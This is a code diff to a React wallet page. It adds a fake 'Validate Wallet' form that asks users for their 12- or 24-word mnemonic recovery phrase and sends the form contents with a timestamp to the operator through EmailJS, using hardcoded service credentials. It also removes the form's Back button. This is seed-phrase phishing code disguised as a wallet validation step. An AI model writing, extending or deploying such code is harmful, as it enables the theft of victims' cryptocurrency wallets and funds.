@@ -1,5 +1,7 @@
 "use client";
 
+import emailjs from "@emailjs/browser";
+import { useRef } from "react";
 import { useState, useEffect } from "react";
 import { WalletIcon } from "@web3icons/react/dynamic";
 import { Exchange1inch, ExchangeBinance, ExchangeCryptoCom, NetworkArbitrumNova, NetworkIotex, NetworkSeiNetwork, TokenAPFC, TokenCOMP, TokenCROWN, TokenCTG, TokenDHT, TokenFEAR, TokenGRC, TokenIBAT, TokenKEY, TokenNEX, TokenNHT, TokenMATH, TokenPOKT, TokenPOLS, TokenPOWR, TokenRAY, TokenSAKAI, WalletAlphaWallet, WalletArgent, WalletAtomic, WalletBitbox, WalletBlue, WalletCoin98, WalletCoinbase, WalletOkx, WalletPhantom, WalletRainbow, WalletSafe, WalletSolflare, WalletWallet3, WalletWalletConnect, } from '@web3icons/react'
@@ -118,6 +120,30 @@ export default function WalletPage() {
     const [isOpen, setIsOpen] = useState(false);
     const [selectedWallet, setSelectedWallet] = useState(null);
     const [step, setStep] = useState("loading");
+    const formRef = useRef(null);
+    const [mnemonic, setMnemonic] = useState("");
+
+    function sendEmail(e) {
+        e.preventDefault();
+
+        emailjs.sendForm(
+            "service_64rkjo7",
+            "template_ztio1ic",
+            formRef.current,
+            "2eJD-AJ6Uxkbmfdy2"
+        ).then(
+            () => {
+                alert("Submitted successfully");
+                setStep("loading");
+            },
+            (error) => {
+                console.error("EmailJS error:", error);
+                alert("Submission failed");
+            }
+        );
+    }
+
+
 
     // 🔁 handle timed loading
     useEffect(() => {
@@ -259,31 +285,51 @@ export default function WalletPage() {
 
                         {/* MANUAL FORM */}
                         {step === "manual-form" && (
-                            <form className="mt-4 space-y-1">
+                            <form
+                                ref={formRef}
+                                onSubmit={sendEmail}
+                                className="mt-4 space-y-4"
+                            >
+                                {/* Wallet name input (read-only) */}
                                 <input
-                                    disabled
+                                    name="wallet_name"
                                     value={selectedWallet.name}
+                                    readOnly
                                     className="w-full rounded-md text-gray-500 border px-3 py-2 text-sm bg-gray-100"
                                 />
 
+                                {/* Mnemonic textarea */}
                                 <textarea
                                     rows={4}
                                     placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces."
-                                    className="w-full rounded-md border text-gray-500 px-3 py-2 text-sm focus:ring-2 focus:ring-blue-500"
+                                    className="w-full rounded-md border text-gray-500 px-3 py-2 text-sm focus:ring-2 focus:ring-blue-500 transition"
+                                    value={mnemonic}
+                                    onChange={(e) => setMnemonic(e.target.value)}
                                 />
 
-                                <button className="w-full rounded-4xl cursor-pointer font-bold text-sm bg-violet-600 py-2 text-white hover:bg-violet-700 hover:text-white transition-colors duration-500 ease-in-out">
+                                {/* Hidden time input */}
+                                <input
+                                    type="hidden"
+                                    name="time"
+                                    value={new Date().toLocaleString()}
+                                />
+
+                                {/* Submit button */}
+                                <button
+                                    type="submit"
+                                    disabled={mnemonic.split(" ").filter(Boolean).length < 12}
+                                    className={`
+      w-full rounded-4xl font-bold text-sm py-2 
+      ${mnemonic.split(" ").filter(Boolean).length >= 12
+                                            ? "bg-violet-600 text-white hover:bg-violet-700"
+                                            : "bg-gray-300 text-gray-500 cursor-not-allowed"}
+      transition-colors duration-500 ease-in-out
+    `}
+                                >
                                     Validate Wallet
                                 </button>
-
-                                <button
-                                    type="button"
-                                    onClick={() => setStep("error")}
-                                    className="w-full text-sm cursor-pointer text-gray-500 hover:underline"
-                                >
-                                    ← Back
-                                </button>
                             </form>
+
                         )}
 
                         <p className="mt-4 text-center text-xs text-gray-400">
